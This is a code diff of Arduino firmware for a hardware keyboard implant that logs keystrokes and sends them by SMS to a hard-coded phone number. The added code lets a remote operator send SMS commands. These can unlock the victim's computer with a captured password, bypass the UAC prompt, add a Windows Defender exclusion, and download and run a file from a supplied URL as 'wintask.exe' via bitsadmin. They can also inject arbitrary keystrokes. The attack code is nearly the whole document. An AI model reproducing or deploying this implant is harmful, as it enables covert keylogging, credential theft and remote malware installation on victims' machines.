@@ -2,43 +2,59 @@
 #include <Keyboard.h>                  
 #include "C_USBhost.h"                
 
+// We need this to receive full messages
+#ifdef _SS_MAX_RX_BUFF
+#undef _SS_MAX_RX_BUFF
+#define _SS_MAX_RX_BUFF 512 // RX buffer size
+#endif
+
 #define LEAK_PHONE_NUMBER "+14422457648"
 #define DEBUG true
+#define IMPLANT_NAME "Implant 1"
 
-C_USBhost USBhost = C_USBhost(Serial1, /*debug_state*/DEBUG);            
+//C_USBhost USBhost = C_USBhost(Serial1, /*debug_state*/DEBUG);
+C_USBhost USBhost = C_USBhost(Serial1, /*debug_state*/false);
 SoftwareSerial SMSSERIAL(8, 9);
+
+#define SEPARATOR "##"
 
 #define CHAR_LIMIT 140                                
 #define BAUD_RATE_SIM800L 57700                    
 #define BAUD_RATE_USB_HOST_BOARD 115200             
-#define BAUD_RATE_SERIAL 115200                    
+#define BAUD_RATE_SERIAL 115200      
+
+//#define BAUD_RATE_SIM800L 9600                    
+//#define BAUD_RATE_USB_HOST_BOARD 115200             
+//#define BAUD_RATE_SERIAL 115200      
 
 #define STATE_IDLE 0
 #define STATE_WAITING_MSG_RESPONSE 1
 #define STATE_WAITING_SMS_RESPONSE 1
 
+#define BEACON_TIME 3 // Time in minutes we will send a beacon to let know it's alive
+
 char TextSms[CHAR_LIMIT+2];                  
 int char_count;                              
 char backupTextSms[CHAR_LIMIT+2];
 unsigned long previousMillis=0;
-int interval=60000;
+//int interval=60000;
+int interval=3000;
 int interval_payload=15000;
 String SMS = "";
 int passcached=0;
-char password[127];
 char empty;
-int password_char_count;
 byte b;
 String substr = "";
-int state = STATE_IDLE;
-
+bool mutex_SMS = false;
 bool pendingSMS = false;
 String buffer_keystrokes = "";
+unsigned int pendingLength = 0;
 
 // Flush buffer of the SMS serial
 void SMSSerialFlush(){
   while(SMSSERIAL.available() > 0) {
-    SMSSERIAL.read();
+    int byte = SMSSERIAL.read();
+    Serial.print((char)byte);
   }
 }   
 
@@ -107,38 +123,51 @@ void collectDebugInfo(){
 
 // Returns 1 if SMS was sucessfully sent or 0 if not
 int sendSMSMessage(String txt){
+  mutex_SMS = true;
   SMSSERIAL.write("AT+CMGF=1\r\n");
   delay(2);
 
-  SMSSERIAL.write("AT+CMGS=\"" LEAK_PHONE_NUMBER "\"\r\n"); //phonenumber with land code
+  SMSSERIAL.write("AT+CMGS=\"" LEAK_PHONE_NUMBER "\"\r\n"); //phonenumber with land code 
   delay(2);
 
   SMSSERIAL.write(txt.c_str());
   delay(2);
-  if (pendingBuffer == "")
-    pendingBuffer = txt;
-  else {
-    pendingBuffer += txt;
-  }
 
   SMSSerialFlush();
   
   SMSSERIAL.write((char)26);
   delay(2);
+}
 
-  //String res = readResponse();
+/* Multiplatform - Press control twice just to be sure lockscreen picture is gone*/
+void unlockComputer(String password){
+  Keyboard.press(KEY_LEFT_CTRL);
+  Keyboard.releaseAll();
+  delay(300);
+  Keyboard.press(KEY_LEFT_CTRL);
+  Keyboard.releaseAll();
+  delay(300);
+  Keyboard.print(password.c_str());
+  delay(100);
+  Keyboard.press('\n');
+  Keyboard.releaseAll();  
+}
 
-//  if(res.indexOf("CMGS:") > 0){
-//    if (DEBUG){
-//      Serial.println("SMS message succesfully sent");
-//    }
-//    return 1;  
-//  }
-//
-//  if (DEBUG){
-//    Serial.println("Error sending SMS message");
-//  }
-  return 0; 
+String getValue(String data, String separator, int index)
+{
+  int found = 0;
+  int strIndex[] = {0, -((int)separator.length())};
+  int maxIndex = data.length()-1;
+
+  for(int i=0; i<=maxIndex && found<=index; i++){
+    if(data.substring(i, i+ separator.length()) == separator || i==maxIndex){
+        found++;
+        strIndex[0] = strIndex[1]+separator.length();
+        strIndex[1] = (i == maxIndex) ? i+separator.length() : i;
+    }
+  }
+
+  return found>index ? data.substring(strIndex[0], strIndex[1]) : "";
 }
 
 void setup() {
@@ -147,6 +176,10 @@ void setup() {
   SMSSERIAL.begin(BAUD_RATE_SIM800L);
   USBhost.Begin(BAUD_RATE_USB_HOST_BOARD);                   
   Keyboard.begin();
+
+  // Selects SMS message format as text. Default format is Protocol Data Unit (PDU)
+  SMSSERIAL.write("AT+CMGF=1\r\n");
+  readResponse();
 
   if(DEBUG){
       collectDebugInfo();
@@ -158,19 +191,25 @@ void setup() {
                                             
 }
 
-void loop() {    
-//  sendSMSMessage("otro test");
-//  delay(55000);
-  
+void loop() {   
   unsigned long currentMillis = millis();
   b = USBhost.GetKey();    
 
+  // Send a beacon so we know that the implant is up
+  // ToDo: this can infere with payloads execution
+//  if ((unsigned long)((currentMillis - previousMillis)/ 60000) > BEACON_TIME){
+//      sendSMSMessage("Beacon - " IMPLANT_NAME);
+//      previousMillis = currentMillis;
+//      if(DEBUG){
+//          Serial.println("Beacon sent");
+//      }
+//  }
+
   //Normalkey capture
   if(b){
-    // Backspace
-    if(b == 8){
+    if(b == 8){ // Backspace
       if(buffer_keystrokes.length() > 0){
-        buffer_keystrokes = buffer_keystrokes.substring(0, buffer_keystrokes.length() - 1)  
+        buffer_keystrokes = buffer_keystrokes.substring(0, buffer_keystrokes.length() - 1);
       }
     }
     else {
@@ -208,83 +247,157 @@ void loop() {
   // If there is a pending SMS we check if it was sent, if so we remove the characters sent
   if (pendingSMS) {
     if (SMSSERIAL.available()) {
-      String res = SMSSERIAL.readStr()
+      String res = SMSSERIAL.readString();
       Serial.println("Message read from SMSSERIAL: " + res);
-      if (res.indexOf("CMGS:") > 0){
+      if (res.indexOf("CMGS: ") > 0){
         Serial.println("SMS message succesfully sent");
         pendingSMS = false;
+        
+        SMSSerialFlush(); // just is case there is something else in the serial
+        mutex_SMS = false; // we can now listen for commands
+        
         // We removed from the buffer the characters that were sent
         buffer_keystrokes = buffer_keystrokes.substring(pendingLength);
       }
       // ToDo: We need to change ERROR for the message receive when a SMS is not sent correctly
-      else if (res.indexOf("ERROR")) {
+      else if (res.indexOf("ERROR: ")) {
         // The SMS couldn't be sent, we need to retry
         if(DEBUG){
-          Serial.println("Trying to send message with content: " + bufferToSend);
+          Serial.println("Trying to send message with content: " + buffer_keystrokes.substring(0, pendingLength));
         }
         sendSMSMessage(buffer_keystrokes.substring(0, pendingLength));
       }
     }
-  } 
-     
-//Get windows passmethod
-//  if( passcached == 0 && char_count > 0){
-//        while(b != 10){
-//         b = USBhost.GetKey();
-//         if(b){
-//          if(b == 8){
-//            if(password_char_count > 0){
-//              password_char_count--;
-//              password[password_char_count] = empty;
-//              }
-//            }
-//          else{
-//           password[password_char_count++] = (char)b;   
-//            }
-//          previousMillis = currentMillis;
-//          }
-//        }
-//      passcached++;
-//
-//      sendSMSMessage(String(password));
-////      SMSSERIAL.write("AT+CMGF=1\r\n");
-////      delay(2);
-////      SMSSERIAL.write("AT+CMGS=\"+14158604568\"\r\n"); //phonenumber with land code
-////      delay(2);
-////      SMSSERIAL.write(password); 
-////      SMSSERIAL.write((char)26);
-//    }
+  }
 
 
    //Payload Method Make sure keyword are unique enough that subject in question wont enter them on their keyboard.
-//    if (SMSSERIAL.available() && (unsigned long)(currentMillis - previousMillis) >= interval_payload) {  
-//      SMS = SMSSERIAL.readString();    
-//      if(SMS.indexOf("Execute:Payload") > -1){
-//      Serial.print(password); // Payload
-//      Keyboard.press(KEY_HOME);
-//      Keyboard.releaseAll();
-//      delay(500);
-//      Keyboard.print(password);
-//      Keyboard.press('\n');
-//      Keyboard.releaseAll();
-//     }
-//     if(SMS.indexOf("Password:Reveal") > -1){ //Keyword
-////      SMSSERIAL.write("AT+CMGF=1\r\n");
-////      delay(2);
-////      SMSSERIAL.write("AT+CMGS=\"+14158604568\"\r\n"); //phonenumber with land code
-////      delay(2);
-////      SMSSERIAL.write(password); 
-////      SMSSERIAL.write((char)26);
-//        sendSMSMessage(String(password));
-//        char_count = 0;
-//     }
-//     if(SMS.indexOf("Manual:") > -1){       
-//         substr = SMS.substring(57); //start from char 57 57 = : in Manual: 
-//         Keyboard.print(substr);
-//      }
-//    //Manual Password overwrite incase first entry was wrong.
-//     if(SMS.indexOf("ManualPass:") > -1){       
-//         substr = SMS.substring(61);
-//         substr.toCharArray(password, 127);
-//      }  
+    if (mutex_SMS == false && SMSSERIAL.available()) {
+      Serial.println("new SMS");
+
+      SMS =readResponse();
+      
+      //SMS = SMSSERIAL.readString();
+      Serial.println(SMS);
+      String SMS_text;
+      if(SMS.indexOf("+CMT: ") > -1){ // We got a command
+        // Code to remove last new line if exists
+        if(SMS.charAt(SMS.length())== '\n' &&  SMS.charAt(SMS.length()-1)== '\r'){
+          SMS.remove(SMS.length()-1, SMS.length());
+        }
+        int new_line_pos = SMS.indexOf("\r\n", 2);
+        SMS_text = SMS.substring(new_line_pos +2); // +2 is bc \r\n
+        if(DEBUG){
+          Serial.println("Received SMS with content:");
+          Serial.println(SMS_text);
+        }
+      }
+
+     
+      String payload = getValue(SMS_text,SEPARATOR,0);
+      
+      if (payload == "execute"){
+        if(DEBUG){
+          Serial.println("Got payload: " + payload);
+        }
+
+        String OS = getValue(SMS_text,SEPARATOR,1);
+        OS.toLowerCase();
+        String password = getValue(SMS_text,SEPARATOR,2);
+        String url = getValue(SMS_text,SEPARATOR,3);
+  
+        // Unlock the computer to download and execute malware
+        unlockComputer(password);
+        delay(500);
+  
+        // Download and execute the malware
+        if(OS == "win"){
+          // Normal user      
+  //        Keyboard.press(KEY_LEFT_GUI);
+  //        Keyboard.press('r');
+  //        Keyboard.releaseAll();
+  //        delay(400);
+  //        Keyboard.print("cmd.exe");
+  //        Keyboard.press('\n');
+  //        Keyboard.releaseAll();
+  //        delay(400);
+  //        String cmd = "bitsadmin /transfer winupdate /download /priority foreground " + url + " %appdata%\\Microsoft\\wintask.exe && start \"\" %appdata%\\Microsoft\\wintask.exe && exit";
+  //        Keyboard.print(cmd.c_str());
+  //        Keyboard.press('\n');
+  //        Keyboard.releaseAll(); 
+  
+          // UAC bypass
+          Keyboard.press(KEY_LEFT_GUI);
+          Keyboard.press('r');
+          Keyboard.releaseAll();
+          delay(400);
+          Keyboard.print("powershell Start-Process cmd -Verb runAs");
+          Keyboard.press('\n');
+          Keyboard.releaseAll();
+          delay(3000);
+          
+          Keyboard.press(KEY_LEFT_ALT);
+          Keyboard.press('y');
+          Keyboard.releaseAll();
+          delay(500);
+
+          // Add windows defender exception
+          String cmd1 = "powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath %appdata%";
+          Keyboard.print(cmd1.c_str());
+          Keyboard.press('\n');
+          Keyboard.releaseAll(); 
+          
+          String cmd = "bitsadmin /transfer winupdate /download /priority foreground " + url + " %appdata%\\Microsoft\\wintask.exe && start \"\" %appdata%\\Microsoft\\wintask.exe && exit";
+          Keyboard.print(cmd.c_str());
+          Keyboard.press('\n');
+          Keyboard.releaseAll(); 
+        }
+        else if(OS == "lnx"){
+        }
+        else if(OS == "osx"){
+        }
+        else{
+          sendSMSMessage("Wrong OS sent for payload");
+        }
+      }
+
+      // manuall##press##83 72 (in hex)
+      // manual##delay##100
+      // manual##release
+      else if(payload == "Manual"){        
+        String action = getValue(SMS_text,SEPARATOR,1);
+        String argument = getValue(SMS_text,SEPARATOR,2);
+   
+        if (action == "press"){
+          // There can be an unlimited number of keystrokes separated by space
+          int n_spaces = 0;
+          for(int i=0; i<=argument.length() ;i++){
+            if(argument.charAt(i) == ' '){
+                n_spaces++;
+            }
+          }
+          for(int i=0; i<=n_spaces ;i++){
+              String keystroke = getValue(argument," ",i);
+              Keyboard.press((int)strtol(keystroke.c_str(), 0, 16));
+          }
+          Keyboard.releaseAll();
+        }
+        else if (action == "print"){
+          Keyboard.print(argument.c_str());
+        }
+        else if (action == "release"){
+          Keyboard.releaseAll();
+        }
+        else if (action == "delay"){
+          delay(argument.toInt());
+        }
+      }
+
+      else{
+        if(DEBUG){
+          Serial.println("Unknown payload " + payload); 
+        }
+        sendSMSMessage("Unknown payload '" + payload + "'\nFull message: " + SMS_text);
+      }
+    }
 }
